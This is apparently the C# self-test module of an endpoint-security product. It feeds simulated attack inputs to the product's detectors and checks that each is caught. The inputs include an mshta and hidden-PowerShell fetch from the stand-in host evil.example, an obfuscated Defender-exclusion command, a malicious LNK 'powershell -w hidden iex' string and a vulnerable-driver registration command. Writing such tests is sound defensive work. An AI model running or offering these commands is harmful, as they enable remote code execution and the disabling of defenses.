using System.Buffers.Binary;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using AegisSentinel.Core.Models;
using AegisSentinel.Core.Services;

namespace AegisSentinel.Core.Engine;

public sealed record SelfTestCheckResult(string Name, bool Passed, string Detail);

/// <summary>
/// Built-in safe, isolated 10-point Red-Team readiness verifier that users can run
/// straight from the AegisSentinel dashboard to prove every defense layer is actively working.
/// </summary>
public static class SecuritySelfTestRunner
{
    public static IReadOnlyList<SelfTestCheckResult> RunAllSafeChecks()
    {
        var results = new List<SelfTestCheckResult>();
        var tempDir = Path.Combine(Path.GetTempPath(), $"AegisSelfTest_{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);

        try
        {
            var policy = GuardPolicy.CreateDefault();
            var tree = new ProcessTreeTracker();
            var intel = new ThreatIntelStore(tempDir);
            var evaluator = new ProcessRuleEvaluator(tree, intel);
            var riskEngine = new BehaviorRiskEngine();
            using var netGuard = new NetworkGuardMonitor(new ProcessController(), new SignatureVerifier(), riskEngine, intel, () => policy);

            // 1. Self-Defense DPAPI HMAC Policy Sealing
            var store = new PolicyStore(tempDir);
            store.Save(policy);
            File.AppendAllText(store.PolicyFilePath, "\n "); // Simulate attacker tampering
            bool tamperCaught = !store.Signer.VerifyFile(store.PolicyFilePath, out _);
            results.Add(new("1. 자가방어 HMAC 정책 변조 차단", tamperCaught, tamperCaught ? "외부 변조 즉시 감지" : "실패"));

            // 2. Fake System Process & Renamed LOLBin Masquerading
            var fakeSys = evaluator.Evaluate(new ProcessEvaluationContext
            {
                ProcessId = 30001, ProcessName = "svchost", ProcessPath = Path.Combine(tempDir, "svchost.exe"),
                Signature = new SignatureInfo(SignatureStatus.Unsigned, "")
            }, policy);
            var renamedLol = evaluator.Evaluate(new ProcessEvaluationContext
            {
                ProcessId = 30002, ProcessName = "updater", ProcessPath = Path.Combine(tempDir, "updater.exe"),
                Signature = new SignatureInfo(SignatureStatus.TrustedMicrosoft, "Microsoft")
            }, policy, originalFilenameOverride: "powershell.exe");
            bool masqOk = fakeSys?.Category == ThreatCategory.Masquerading && renamedLol?.Category == ThreatCategory.Masquerading;
            results.Add(new("2. 시스템 위장 / 이름변경 LOLBin 차단", masqOk, masqOk ? "T1036.003 / T1036.005 차단 확인" : "실패"));

            // 3. Chrome ABE Remote-Debugging Session Hijack
            var abe = evaluator.Evaluate(new ProcessEvaluationContext
            {
                ProcessId = 30003, ProcessName = "chrome", ProcessPath = @"C:\Program Files\Google\Chrome\Application\chrome.exe",
                CommandLine = "chrome.exe --remote-debugging-port=9222 --headless",
                ParentProcessId = 30000, ParentProcessName = "nikke_launcher",
                Signature = new SignatureInfo(SignatureStatus.TrustedVendor, "Google LLC")
            }, policy);
            bool abeOk = abe?.Category == ThreatCategory.CredentialAccess && abe.Severity == ThreatSeverity.Critical;
            results.Add(new("3. 브라우저 원격디버깅(ABE 우회) 차단", abeOk, abeOk ? "T1539 세션 쿠키 탈취 차단" : "실패"));

            // 4. Multi-Hop Supply Chain (NIKKE-style)
            tree.RecordStart(31000, 1000, "nikke_launcher", @"C:\Games\NIKKE\nikke_launcher.exe", "");
            tree.RecordStart(31001, 31000, "helper", @"C:\Games\NIKKE\helper.exe", "");
            var sc = evaluator.Evaluate(new ProcessEvaluationContext
            {
                ProcessId = 31002, ProcessName = "tinyget", ProcessPath = Path.Combine(Path.GetTempPath(), "tinyget.exe"),
                ParentProcessId = 31001, ParentProcessName = "helper",
                Signature = new SignatureInfo(SignatureStatus.Unsigned, "")
            }, policy);
            bool scOk = sc?.Category == ThreatCategory.SupplyChain && sc.ProcessAncestry.Contains("nikke_launcher");
            results.Add(new("4. 다단계 공급망 계보 추적", scOk, scOk ? "3단계 런처 계보 즉시 탐지" : "실패"));

            // 5. AI Polymorphic Script De-Obfuscation
            var aiScript = FilelessScriptGuard.AnalyzeScriptBlock("Add`-Mp`Pre`fer`ence -Ex`clu`sionPath ('C:\\Pub'+'lic')", 31005, policy);
            bool aiOk = aiScript?.Category == ThreatCategory.FilelessScript && aiScript.Severity == ThreatSeverity.Critical;
            results.Add(new("5. AI 다형성 난독화 파일리스 탐지", aiOk, aiOk ? "백틱·문자열분할 역난독화 탐지" : "실패"));

            // 6. HTTPS 443 Exfiltration & Raw-IP C2
            var exfil = netGuard.EvaluateOutboundConnection(
                31006, "stealer", Path.Combine(Path.GetTempPath(), "stealer.exe"),
                IPAddress.Parse("149.154.167.220"), 443, policy,
                new SignatureInfo(SignatureStatus.Unsigned, ""), domainOverride: "api.telegram.org");
            var rawIp = netGuard.EvaluateOutboundConnection(
                31007, "beacon", Path.Combine(tempDir, "beacon.exe"),
                IPAddress.Parse("198.51.100.88"), 443, policy,
                new SignatureInfo(SignatureStatus.Unsigned, ""), domainOverride: "");
            bool netOk = exfil?.Category == ThreatCategory.Exfiltration && rawIp?.Category == ThreatCategory.NetworkAnomaly;
            results.Add(new("6. HTTPS 443 유출 & 무-DNS Raw IP C2", netOk, netOk ? "Telegram 유출 + Raw IP C2 탐지" : "실패"));

            // 7. ClickFix Clipboard Guard
            var clip = new ClipboardGuard();
            var clickFix = clip.EvaluateClipboardText("mshta https://evil.example/verify.hta", policy);
            bool clipOk = clickFix?.Category == ThreatCategory.ClipboardAttack;
            results.Add(new("7. ClickFix 클립보드 악성 명령 차단", clipOk, clipOk ? "클립보드 원격 스크립트 주입 탐지" : "실패"));

            // 8. Entropy Ransomware + Anti-Poisoning Vault Recovery
            var vault = new RecoveryVault(tempDir);
            var doc = Path.Combine(tempDir, "test_doc.txt");
            var clean = string.Join("\n", Enumerable.Repeat("Safe clean user document text.", 30));
            File.WriteAllText(doc, clean);
            vault.TrySnapshotFile(doc);
            var snapId = vault.ListSnapshots().FirstOrDefault()?.Id ?? string.Empty;
            File.WriteAllBytes(doc, RandomNumberGenerator.GetBytes(4096));
            bool encCaught = EntropyAnalyzer.AnalyzeFile(doc).IsLikelyEncrypted && !vault.TrySnapshotFile(doc);
            if (!string.IsNullOrEmpty(snapId)) vault.RestoreSnapshot(snapId);
            bool vaultOk = encCaught && File.ReadAllText(doc) == clean;
            results.Add(new("8. 엔트로피 랜섬웨어 & 복구 금고", vaultOk, vaultOk ? "암호화 탐지 + 백업 오염 차단 + 100% 복원" : "실패"));

            // 9. Hosts / Proxy (including PAC AutoConfigURL) / Defender Exclusion Tamper Guard
            var hostsEvt = SystemIntegrityGuard.EvaluateHostsDiff("AAA", "BBB", @"C:\Windows\System32\drivers\etc\hosts");
            var proxyEvt = SystemIntegrityGuard.EvaluateProxyDiff("0||", "1|127.0.0.1:8080|");
            var pacEvt = SystemIntegrityGuard.EvaluateProxyDiff("0||", "0||http://evil.example/proxy.pac");
            var exclEvt = SystemIntegrityGuard.EvaluateDefenderExclusionDiff(new HashSet<string>(), new HashSet<string> { @"Paths:C:\Users\Public" });
            bool sysOk = hostsEvt is not null && proxyEvt is not null && pacEvt is not null && exclEvt is not null;
            results.Add(new("9. Hosts · 프록시(PAC) · Defender 예외 변조", sysOk, sysOk ? "OS 무결성/MITM 변조 전부 탐지" : "실패"));

            // 10. Zero-False-Positive Normal Chrome Check
            var benign = evaluator.Evaluate(new ProcessEvaluationContext
            {
                ProcessId = 31099, ProcessName = "chrome", ProcessPath = @"C:\Program Files\Google\Chrome\Application\chrome.exe",
                ParentProcessId = 1000, ParentProcessName = "explorer",
                Signature = new SignatureInfo(SignatureStatus.TrustedVendor, "Google LLC")
            }, policy);
            results.Add(new("10. 정상 앱 오탐률 검증 (저마찰)", benign is null, benign is null ? "정상 Chrome 오탐 0건" : "오탐 발생"));

            // 11. North Korean Kimsuky Malicious .LNK Spear-Phishing (Shell + Whitespace Padding + Double Ext)
            var lnkBytes = new byte[256];
            BinaryPrimitives.WriteUInt32LittleEndian(lnkBytes.AsSpan(0, 4), 0x0000004C);
            var lnkCmd = Encoding.Unicode.GetBytes("cmd.exe /c                                             powershell -w hidden iex");
            lnkCmd.CopyTo(lnkBytes, 80);
            var lnkRes = LnkAndContainerAnalyzer.AnalyzeLnkBytes(lnkBytes, 45 * 1024, "국세청_세금계산서.hwp.lnk");
            results.Add(new("11. 북한 김수키 악성 LNK 스피어피싱", lnkRes.IsMaliciousOrSuspicious && lnkRes.RiskScore >= 90,
                lnkRes.IsMaliciousOrSuspicious ? $"LNK 위험도 {lnkRes.RiskScore}/100 탐지" : "실패"));

            // 12. HWP/Office Document Exploit & Korean Security Agent (MagicLine/VeraPort) Watering Hole
            var hwpExploit = evaluator.Evaluate(new ProcessEvaluationContext
            {
                ProcessId = 32001, ProcessName = "cmd", ProcessPath = @"C:\Windows\System32\cmd.exe",
                ParentProcessId = 32000, ParentProcessName = "Hwp",
                Signature = new SignatureInfo(SignatureStatus.TrustedMicrosoft, "Microsoft")
            }, policy);
            var krAgent = evaluator.Evaluate(new ProcessEvaluationContext
            {
                ProcessId = 32003, ProcessName = "powershell", ProcessPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                ParentProcessId = 32002, ParentProcessName = "MagicLine4NX",
                Signature = new SignatureInfo(SignatureStatus.TrustedMicrosoft, "Microsoft")
            }, policy);
            bool krOk = hwpExploit?.Category == ThreatCategory.DocumentExploit && krAgent?.Category == ThreatCategory.SupplyChain;
            results.Add(new("12. 한글(HWP) 취약점 & 국내 보안모듈 워터링홀", krOk, krOk ? "HWP 악성문서 + 금융보안 에이전트 자식 차단" : "실패"));

            // 13. Lazarus BeaverTail/OtterCookie (Node.js Wallet/Cookie Theft) & Kimsuky Cloud C2
            using var credGuard = new CredentialAndDllGuard(new SignatureVerifier(), () => policy);
            var nodeWalletTheft = credGuard.EvaluateSensitiveFileAccess(
                32004, "node", @"C:\Program Files\nodejs\node.exe",
                @"C:\Users\Dev\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn\000003.log",
                policy);
            var cloudC2 = netGuard.EvaluateOutboundConnection(
                32005, "mshta", @"C:\Windows\System32\mshta.exe",
                IPAddress.Parse("185.199.108.133"), 443, policy,
                new SignatureInfo(SignatureStatus.TrustedMicrosoft, "Microsoft"),
                domainOverride: "raw.githubusercontent.com");
            bool lazOk = nodeWalletTheft?.Category == ThreatCategory.CredentialAccess && cloudC2?.Category == ThreatCategory.Exfiltration;
            results.Add(new("13. 라자루스 Node.js 지갑탈취 & 클라우드 C2", lazOk, lazOk ? "BeaverTail 지갑접근 + LOLBin 클라우드 C2 차단" : "실패"));

            // 14. UAC Bypass (fodhelper) & BYOVD Kernel Driver / Hidden Admin Account Creation
            var uacBypass = evaluator.Evaluate(new ProcessEvaluationContext
            {
                ProcessId = 32007, ProcessName = "powershell", ProcessPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                ParentProcessId = 32006, ParentProcessName = "fodhelper",
                Signature = new SignatureInfo(SignatureStatus.TrustedMicrosoft, "Microsoft")
            }, policy);
            var byovd = evaluator.Evaluate(new ProcessEvaluationContext
            {
                ProcessId = 32008, ProcessName = "sc", ProcessPath = @"C:\Windows\System32\sc.exe",
                CommandLine = @"sc.exe create VulnDrv binPath= C:\Users\Public\vuln.sys type= kernel",
                Signature = new SignatureInfo(SignatureStatus.TrustedMicrosoft, "Microsoft")
            }, policy);
            bool privOk = uacBypass?.Category == ThreatCategory.PrivilegeEscalation && byovd?.Category == ThreatCategory.PrivilegeEscalation;
            results.Add(new("14. UAC 권한상승 우회 & BYOVD 취약드라이버", privOk, privOk ? "T1548.002 UAC 우회 + 커널 드라이버 등록 차단" : "실패"));

            // 15. v7.0 Pre-execution Script Static Scan & In-Memory ZIP Archive Malware Inspection
            var vbsCheck = ScriptFileAnalyzer.AnalyzeScriptContent(
                "Set s = CreateObject(\"WScript.Shell\")\nSet h = CreateObject(\"MSXML2.XMLHTTP\")\ns.Run \"powershell -w hidden https://evil.example/p.ps1\"",
                ".vbs",
                policy);
            var zipPath = Path.Combine(tempDir, "invoice_bundle.zip");
            using (var zip = System.IO.Compression.ZipFile.Open(zipPath, System.IO.Compression.ZipArchiveMode.Create))
            {
                var entry = zip.CreateEntry("세금계산서.hwp.lnk");
                using var es = entry.Open();
                es.Write(lnkBytes, 0, lnkBytes.Length);
            }
            var zipCheck = ZipArchiveAnalyzer.AnalyzeZipFile(zipPath, policy);
            bool v7Ok = vbsCheck.IsSuspicious && zipCheck.IsMaliciousOrSuspicious && zipCheck.RiskScore >= 85;
            results.Add(new("15. ZIP 내부 메모리 검사 & 스크립트 정적 스캔", v7Ok, v7Ok ? "압축해제 전 ZIP 내부 악성 LNK + VBS 드로퍼 탐지" : "실패"));
        }
        finally
        {
            try
            {
                if (Directory.Exists(tempDir))
                {
                    foreach (var f in Directory.EnumerateFiles(tempDir, "*", SearchOption.AllDirectories))
                    {
                        try { File.SetAttributes(f, FileAttributes.Normal); } catch { }
                    }
                    Directory.Delete(tempDir, recursive: true);
                }
            }
            catch { }
        }

        return results;
    }
}
